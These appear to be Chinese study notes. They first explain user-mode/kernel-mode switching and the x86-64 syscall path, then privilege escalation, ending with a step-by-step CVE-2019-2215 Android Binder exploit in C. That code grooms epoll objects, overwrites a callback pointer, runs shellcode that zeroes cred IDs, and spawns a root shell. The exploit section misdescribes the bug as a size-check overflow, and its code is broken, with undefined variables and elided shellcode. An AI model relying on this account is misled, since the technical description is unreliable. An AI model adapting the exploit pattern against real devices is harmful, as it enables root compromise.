# 用户态与内核态切换详解

## 1. 用户态与内核态的定义

**用户态(User Mode)**:
- 普通应用程序运行的特权级别
- 受限的内存访问权限，只能访问分配给应用程序的内存空间
- 无法直接访问硬件设备和执行特权指令
- 代码运行在较低的CPU特权级别(如x86架构的Ring 3)

**内核态(Kernel Mode)**:
- 操作系统内核运行的特权级别
- 完全的内存访问权限，可以访问所有系统内存和硬件资源
- 可以执行特权指令，如I/O操作、中断处理等
- 代码运行在最高的CPU特权级别(如x86架构的Ring 0)

## 2. 为什么切换不好

用户态和内核态之间的切换成本高昂，主要原因包括：

1. **性能开销**:
   - 每次切换需要保存和恢复大量CPU寄存器状态
   - 切换会导致CPU缓存和TLB(Translation Lookaside Buffer)失效
   - 一次切换可能消耗数百到数千个CPU周期

2. **上下文切换成本**:
   - 需要保存当前执行上下文(寄存器值、程序计数器等)
   - 加载新的执行上下文
   - 切换内存映射(页表)

3. **系统资源消耗**:
   - 频繁切换会增加系统负载
   - 降低CPU利用率和吞吐量
   - 增加系统延迟

4. **安全检查开销**:
   - 切换时需要进行权限验证
   - 参数合法性检查
   - 内存边界检查

## 3. 切换的具体过程

用户态到内核态的切换是一个复杂的硬件和软件协同过程：

1. **触发切换的方式**:
   - 系统调用(如read(), write()等)
   - 硬件中断(如时钟中断、I/O完成中断)
   - 异常(如页错误、除零错误)
   - 软件中断(如int指令)

2. **切换的具体步骤**:
   - **保存用户态上下文**: CPU将当前用户程序的寄存器状态(包括程序计数器、栈指针等)保存到内核栈
   - **切换栈指针**: 从用户栈切换到内核栈
   - **切换特权级别**: CPU特权级从Ring 3提升到Ring 0
   - **切换页表**: 如果需要，切换到内核空间的页表
   - **执行内核代码**: 处理系统调用、中断或异常
   - **恢复用户态上下文**: 完成内核操作后，恢复之前保存的用户态寄存器状态
   - **降低特权级别**: 从Ring 0降回Ring 3
   - **返回用户程序**: 继续执行用户程序

3. **x86架构下的具体实现**:
   ```assembly
   ; 简化的系统调用过程(x86-64)
   ; 用户程序执行系统调用
   mov rax, 1      ; 系统调用号(如write)
   mov rdi, 1      ; 第一个参数
   mov rsi, buffer ; 第二个参数
   mov rdx, len    ; 第三个参数
   syscall         ; 触发系统调用，CPU从用户态切换到内核态
   
   ; 内核中处理系统调用
   ; 1. 保存用户态寄存器
   ; 2. 根据rax查找系统调用表
   ; 3. 执行对应的内核函数
   ; 4. 恢复用户态寄存器
   ; 5. 返回用户态
   ```

4. **内存视角的切换**:
   - 用户态程序只能访问用户空间内存
   - 切换到内核态后，可以访问整个物理内存
   - 切换过程中可能需要更新CR3寄存器(页表基址寄存器)，导致TLB刷新

这种切换机制是操作系统安全和稳定性的基础，但也是性能瓶颈之一。现代事件多路复用机制(如epoll、kqueue)的设计目标之一就是减少这种切换的频率，通过一次系统调用处理多个I/O事件，从而提高系统性能。


# 提权
许多恶意软件和黑客攻击以"提权"(privilege escalation)为核心目标，即从普通用户权限获取系统/内核级别权限。这种攻击通常分为两个阶段：

- 获取用户空间执行权限 ：通过钓鱼、漏洞利用等方式在目标系统上执行代码
- 提升到内核权限 ：利用漏洞绕过用户态/内核态的隔离机制

## 2. 常见的提权方式
### 内核漏洞利用
1. 缓冲区溢出 ：
   
   - 利用内核代码中的缓冲区溢出漏洞
   - 例如：CVE-2019-2215 (Android Binder驱动漏洞)
2. 整数溢出 ：
   
   - 利用整数计算错误导致的内存分配问题
   - 例如：CVE-2017-1000112 (Linux UDP漏洞)
3. 未初始化内存使用 ：
   
   - 利用内核未正确初始化的内存区域
   - 例如：CVE-2010-2959 (Linux compat层漏洞)
4. 竞态条件 ：
   
   - 利用内核操作之间的时间窗口
   - 例如：Dirty COW (CVE-2016-5195)
### 系统调用漏洞
1. 参数验证不足 ：
   
   - 内核未充分验证系统调用参数
   - 例如：CVE-2018-8897 (POP SS处理漏洞)
2. 权限检查绕过 ：
   
   - 绕过系统调用中的权限检查逻辑
   - 例如：CVE-2019-13272 (Linux ptrace漏洞)
### 驱动程序漏洞
1. 第三方驱动 ：
   
   - 许多设备驱动运行在内核态但安全性较差
   - 例如：许多显卡、打印机驱动漏洞
2. IOCTL接口 ：
   
   - 驱动程序的IOCTL接口常成为攻击目标
   - 例如：CVE-2018-19824 (NVIDIA驱动漏洞)


## CVE-2019-2215的具体攻击过程
1. 漏洞本质 ：
   
   - Binder驱动中的 binder_transaction 函数没有正确验证输入大小
   - 允许攻击者控制一个特殊的内核对象(epoll_event)的内存布局
2. 攻击步骤 ：
   
   - 准备阶段 ：
     
     - 创建特定的内核对象布局（通过epoll系统调用）
     - 分配一系列内核内存块，使目标对象处于可预测位置
   - 触发漏洞 ：
     
     - 发送特制的Binder事务请求
     - 请求中包含精心计算的大小值，导致越界写入
   - 内存覆盖 ：
     
     - 溢出的数据覆盖了相邻的epoll_event结构
     - 修改了其中的函数指针（如callback字段）
   - 执行控制 ：
     
     - 当内核调用被修改的函数指针时
     - 执行流程被劫持到攻击者控制的代码路径
3. 提权实现 ：
   
   - 代码注入 ：
     
     - 将shellcode注入到用户空间的可执行内存
     - 通过覆盖的函数指针跳转到该代码
   - 权限修改 ：
     
     - shellcode定位当前进程的 cred 结构（存储进程权限信息）
     - 修改uid/gid/euid/egid等字段为0（root权限）
     ```c
     // 简化的shellcode逻辑
     struct cred *cred = (struct cred *)current->cred;
     cred->uid.val = cred->gid.val = 0;
     cred->euid.val = cred->egid.val = 0;
     cred->suid.val = cred->sgid.val = 0;
      ```
     ```
   - 权限提升完成 ：
     
     - 进程获得root权限
     - 可以执行任何系统操作
### code
# CVE-2019-2215 漏洞利用代码解释

下面是对 Android Binder 驱动漏洞 (CVE-2019-2215) 攻击过程的简化代码解释：

## 1. 准备阶段

```c
// exploit_example.c
// 创建 epoll 实例
int epfd = epoll_create(1000);
if (epfd < 0) {
    perror("epoll_create failed");
    return -1;
}

// 准备内存布局，创建多个 epoll_event 对象
struct epoll_event event = {.events = EPOLLIN};
for (int i = 0; i < 512; i++) {
    // 填充内核内存，使目标对象位置可预测
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, pipes[i][0], &event) != 0) {
        perror("epoll_ctl failed");
        return -1;
    }
}
```

## 2. 触发漏洞

```c
// exploit_example.c
// 打开 Binder 设备
int binder_fd = open("/dev/binder", O_RDONLY);
if (binder_fd < 0) {
    perror("Failed to open binder");
    return -1;
}

// 构造特制的 Binder 事务数据
struct binder_transaction_data txn;
memset(&txn, 0, sizeof(txn));

// 设置精心计算的大小值，导致缓冲区溢出
txn.data_size = 0xffffffc0; // 特殊的负值，绕过大小检查
txn.offsets_size = 0;
txn.data.ptr.buffer = (uintptr_t)buffer;
txn.data.ptr.offsets = 0;

// 触发漏洞
ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
```

## 3. 内存覆盖

```c
// exploit_example.c
// 构造要写入的数据，覆盖 epoll_event 结构中的函数指针
unsigned long fake_callback[10] = {0};
// 设置跳转到我们的 shellcode 的地址
fake_callback[2] = (unsigned long)shellcode_addr;

// 将伪造的回调函数写入溢出的缓冲区
memcpy(overflow_buffer, fake_callback, sizeof(fake_callback));
```

## 4. 准备 Shellcode

```c
// exploit_example.c
// 分配可执行内存
void *shellcode_addr = mmap(NULL, 0x1000, 
                           PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

// 权限提升 shellcode
unsigned char shellcode[] = {
    // 汇编指令，完成以下 C 代码的功能:
    // struct cred *cred = (struct cred *)current->cred;
    // cred->uid.val = cred->gid.val = 0;
    // cred->euid.val = cred->egid.val = 0;
    // cred->suid.val = cred->sgid.val = 0;
    
    0x48, 0x65, /* ... 更多字节码 ... */ 0xc3
};

// 复制 shellcode 到可执行内存
memcpy(shellcode_addr, shellcode, sizeof(shellcode));
```

## 5. 触发执行

```c
// exploit_example.c
// 触发被修改的回调函数执行
// 通常通过对 epoll 实例执行某些操作
struct epoll_event events[10];
epoll_wait(epfd, events, 10, 100);

// 检查权限是否提升
if (getuid() == 0) {
    printf("提权成功! 当前拥有 root 权限\n");
    
    // 现在可以执行任何需要 root 权限的操作
    system("/system/bin/sh");
} else {
    printf("提权失败\n");
}
```

